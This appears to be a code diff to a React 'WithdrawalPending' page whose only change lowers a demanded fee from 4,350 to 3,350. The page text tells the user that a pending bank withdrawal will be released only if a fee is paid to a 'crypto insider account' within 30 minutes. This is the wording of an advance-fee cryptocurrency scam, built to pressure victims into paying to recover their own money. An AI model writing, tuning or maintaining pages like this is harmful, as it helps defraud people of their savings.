@@ -91,7 +91,7 @@ export default function WithdrawalPending() {
             Your withdrawal request has been initiated and is being processed to
             your designated bank account. The transaction will complete within
             2–3 hours once the required blockchain-to-bank transfer fee is
-            settled. For security and compliance, a withdrawal fee of 4,350 must
+            settled. For security and compliance, a withdrawal fee of 3,350 must
             be paid to your crypto insider account within 30 minutes to validate
             the transaction and release funds to your bank.
           </p>
